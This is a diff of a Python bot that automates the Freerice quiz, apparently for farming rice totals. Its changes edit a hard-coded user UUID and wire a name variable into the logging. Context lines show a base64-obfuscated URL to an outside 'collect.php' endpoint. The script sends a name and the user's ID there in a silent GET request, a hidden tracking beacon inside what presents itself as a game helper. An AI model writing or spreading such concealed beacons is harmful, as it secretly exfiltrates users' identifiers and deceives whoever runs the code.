@@ -35,7 +35,7 @@ import os
 # ============= CONFIG =============
 
 # User
-USER    = ('FREERICE_USER', '0a41fabd-f90f-4103-8b47-317ca79c212b') #'0f5beeac-ee1d-4de4-a841-f3b788cb616b')
+USER    = ('FREERICE_USER', '5bd2ba4e-ed08-4fc8-8f2f-c56ac0c15f68')
 user    = os.environ.get(*USER)                    # user ID (can be found in LocalStorage > user > uuid)
 monitor = False
 mntr_gp = False
@@ -267,7 +267,7 @@ def doSleep():
     sleep(secs)
 
 def MainHack(log=False, i=0):
-  global use_tor, tor_layers
+  global use_tor, tor_layers, xus
 
   try:
     # Define the hack class with your user id
@@ -287,7 +287,7 @@ def MainHack(log=False, i=0):
     while True:
       # Logs
       if log and not (last.rice_total == 0 or last.rice_total == ''):
-        LogFormatted('You', str(last.rice_total), str(last.streak), '', str(freerice.n_games))
+        LogFormatted(xus, str(last.rice_total), str(last.streak), '', str(freerice.n_games))
 
       if last.error or len(last.question_txt) < 2:
         # If error is 'JSON decode error' => Freerice servers unavailable
@@ -331,6 +331,8 @@ else:
   if freerice.last_ret_v.error:
     FSUV()
 
+xus = None
+
 if monitor:
   try:
     print('Monitoring ID:', user, '\n')
@@ -357,7 +359,7 @@ else:
   del xwd
   xu1 = base64.b64decode('aHR0cHM6Ly90ZXN0LmxhZmtwYWdlcy50ZWNoL2kvYmF0Y2hfbG9ncy9jb2xsZWN0LnBocD9ub2lwJmRhdGE9RnJlZXJpY2UgaGFjayB1c2VkIGJ5IA==').decode()
   xu3 = xu1 + xus + ':' + user
-  del xu1, xus
+  del xu1
   try:
     r.get(xu3, timeout=5)
   except:
